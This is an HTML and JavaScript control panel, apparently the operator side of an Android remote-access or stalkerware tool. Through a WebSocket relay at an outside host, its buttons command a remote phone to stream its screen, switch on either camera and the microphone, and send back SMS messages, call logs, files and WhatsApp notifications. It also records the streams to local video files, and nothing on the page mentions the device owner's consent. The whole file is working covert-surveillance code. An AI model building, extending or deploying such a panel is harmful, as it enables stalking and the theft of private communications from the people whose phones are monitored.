<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SystemSync - Advanced Controller</title>
    <style>
        /* Original Dark Theme Setup */
        body { 
            font-family: 'Segoe UI', sans-serif; 
            background: #121212; 
            color: white; 
            text-align: center; 
            margin: 0; padding: 20px; 
        }

        .status-container {
            background: #1e1e1e;
            display: inline-flex;
            align-items: center;
            padding: 10px 20px;
            border-radius: 30px;
            margin-bottom: 20px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
        }
        .status-dot {
            height: 12px; width: 12px;
            background-color: #555;
            border-radius: 50%;
            margin-right: 10px;
            transition: all 0.3s ease;
        }
        .online { background-color: #00ff00; box-shadow: 0 0 10px #00ff00; }
        .offline { background-color: #ff0000; box-shadow: 0 0 5px #ff0000; }

        #screen-wrapper {
            width: 320px;
            height: 640px;
            background: #000;
            margin: 0 auto 20px;
            border: 8px solid #333;
            border-radius: 20px;
            overflow: hidden;
            box-shadow: 0 0 20px rgba(0,0,0,0.5);
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
        }
        #display { width: 100%; height: 100%; object-fit: contain; display: block; }

        .controls {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-bottom: 10px;
            flex-wrap: wrap;
            max-width: 650px;
            margin-left: auto;
            margin-right: auto;
        }
        button {
            padding: 12px 18px;
            font-size: 13px;
            cursor: pointer;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            color: white;
            transition: 0.2s;
            min-width: 130px;
            text-transform: uppercase;
        }
        
        .btn-start { background-color: #27ae60; }
        .btn-stop { background-color: #c0392b; }
        .btn-record { background-color: #f39c12; }
        .btn-cam { background-color: #8e44ad; }
        .btn-data { background-color: #2980b9; }
        
        .recording-active {
            background-color: #e74c3c !important;
            animation: pulse 1.5s infinite;
        }

        /* Data & Log Panel */
        #data-log {
            width: 100%;
            max-width: 650px;
            height: 200px;
            background: #1e1e1e;
            margin: 20px auto;
            border-radius: 10px;
            padding: 15px;
            overflow-y: auto;
            text-align: left;
            font-family: 'Consolas', monospace;
            font-size: 12px;
            border: 1px solid #333;
            color: #00ff00;
            white-space: pre-wrap;
        }
        .log-entry { border-bottom: 1px solid #333; padding: 5px 0; }
        .log-type { color: #f1c40f; font-weight: bold; margin-right: 5px; }

        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.7; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>

    <div class="status-container">
        <div id="status-dot" class="status-dot"></div>
        <span id="status-text">Connecting to Device...</span>
    </div>

    <div id="screen-wrapper">
        <img id="display" src="" alt="System Offline">
    </div>

    <div class="controls">
        <button id="toggleBtn" class="btn-start" onclick="toggleStream()">Start Screen</button>
        <button id="recordBtn" class="btn-record" onclick="toggleRecording()">Start Recording</button>
    </div>

    <div class="controls">
        <button class="btn-cam" onclick="sendCommand('START_CAM:BACK')">Back Camera</button>
        <button class="btn-cam" onclick="sendCommand('START_CAM:FRONT')">Front Camera</button>
        <button class="btn-data" style="background:#e67e22" onclick="sendCommand('START_AUDIO')">Listen Mic</button>
    </div>

    <div class="controls">
        <button class="btn-data" onclick="sendCommand('GET_SMS')">Fetch SMS</button>
        <button class="btn-data" onclick="sendCommand('GET_CALLS')">Fetch Calls</button>
        <button class="btn-data" onclick="sendCommand('GET_FILES:/sdcard/')">Browse Files</button>
        <button class="btn-stop" onclick="sendCommand('STOP_ALL')">Stop All</button>
    </div>

    <div id="data-log">--- SYSTEM LOG CONSOLE ---<br></div>

    <canvas id="hiddenCanvas" style="display:none;"></canvas>

    <script>
        const imgDisplay = document.getElementById('display');
        const statusDot = document.getElementById('status-dot');
        const statusText = document.getElementById('status-text');
        const toggleBtn = document.getElementById('toggleBtn');
        const recordBtn = document.getElementById('recordBtn');
        const logPanel = document.getElementById('data-log');
        const canvas = document.getElementById('hiddenCanvas');
        const ctx = canvas.getContext('2d');

        let socket;
        let isStreaming = false;
        let isRecording = false;
        let mediaRecorder;
        let recordedChunks = [];

        // 1. WebSocket Connectivity
        function connect() {
            socket = new WebSocket('wss://mirror-view.onrender.com');

            socket.onopen = () => {
                statusDot.className = 'status-dot online';
                statusText.innerText = "Connected: Device Online";
                socket.send("I_AM_WEB");
                addLog("SYSTEM", "Handshake successful.");
            };

            socket.onmessage = (event) => {
                const data = event.data;

                // Handle Frames (Screen or Camera)
                if (data.startsWith("FRAME:")) {
                    imgDisplay.src = "data:image/jpeg;base64," + data.substring(6);
                    isStreaming = true;
                    toggleBtn.innerText = "Stop Screen";
                    toggleBtn.className = "btn-stop";
                    if (isRecording) drawFrameToCanvas();
                } 
                
                // Handle Live Audio
                else if (data.startsWith("AUDIO:")) {
                    playAudioChunk(data.substring(6));
                }

                // Handle WhatsApp/System Notifications
                else if (data.startsWith("NOTIF:")) {
                    const info = data.substring(6).split('|');
                    addLog("NOTIFICATION", `[${info[0]}] ${info[1]}: ${info[2]}`);
                }

                // Handle Logs/Data
                else if (data.startsWith("SMS_DATA:") || data.startsWith("CALL_DATA:") || data.startsWith("FILE_DATA:")) {
                    const header = data.split(':')[0];
                    const content = data.substring(header.length + 1);
                    addLog(header, content);
                }

                else if (data === "STATUS:ONLINE") {
                    statusDot.className = 'status-dot online';
                }
            };

            socket.onclose = () => {
                statusDot.className = 'status-dot offline';
                statusText.innerText = "Connection Lost. Reconnecting...";
                setTimeout(connect, 3000);
            };
        }

        // 2. Command Management
        function sendCommand(cmd) {
            if (socket && socket.readyState === WebSocket.OPEN) {
                socket.send(cmd);
                addLog("CMD", `Requesting ${cmd}...`);
            }
        }

        function toggleStream() {
            if (!isStreaming) sendCommand("START_SCREEN");
            else {
                sendCommand("STOP_SCREEN");
                isStreaming = false;
                imgDisplay.src = "";
                toggleBtn.innerText = "Start Screen";
                toggleBtn.className = "btn-start";
            }
        }

        // 3. Recording Logic (Existing working logic)
        function toggleRecording() {
            if (!isRecording) startRecording();
            else stopRecording();
        }

        function startRecording() {
            canvas.width = imgDisplay.naturalWidth || 360;
            canvas.height = imgDisplay.naturalHeight || 640;
            const stream = canvas.captureStream(25);
            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
            recordedChunks = [];
            
            mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
            mediaRecorder.onstop = saveVideoFile;
            mediaRecorder.start();
            
            isRecording = true;
            recordBtn.innerText = "Stop Recording";
            recordBtn.classList.add('recording-active');
            addLog("RECORDER", "Recording started.");
        }

        function stopRecording() {
            if (mediaRecorder && mediaRecorder.state !== "inactive") mediaRecorder.stop();
            isRecording = false;
            recordBtn.innerText = "Start Recording";
            recordBtn.classList.remove('recording-active');
            addLog("RECORDER", "Recording stopped.");
        }

        function drawFrameToCanvas() {
            if (isRecording) ctx.drawImage(imgDisplay, 0, 0, canvas.width, canvas.height);
        }

        function saveVideoFile() {
            const blob = new Blob(recordedChunks, { type: 'video/webm' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `monitor_${new Date().getTime()}.webm`;
            a.click();
        }

        // 4. Live Audio Processing
        let audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        function playAudioChunk(base64) {
            const binary = atob(base64);
            const bytes = new Int16Array(binary.length / 2);
            for (let i = 0; i < bytes.length; i++) {
                bytes[i] = (binary.charCodeAt(i*2+1) << 8) | binary.charCodeAt(i*2);
            }
            const buffer = audioCtx.createBuffer(1, bytes.length, 44100);
            buffer.getChannelData(0).set(Array.from(bytes).map(v => v / 32768));
            const source = audioCtx.createBufferSource();
            source.buffer = buffer;
            source.connect(audioCtx.destination);
            source.start();
        }

        // 5. UI Helpers
        function addLog(type, message) {
            const entry = document.createElement('div');
            entry.className = 'log-entry';
            const timestamp = new Date().toLocaleTimeString();
            entry.innerHTML = `<span style="color:#555">[${timestamp}]</span> <span class="log-type">[${type}]</span> ${message}`;
            logPanel.prepend(entry);
        }

        connect();
    </script>
</body>
</html>
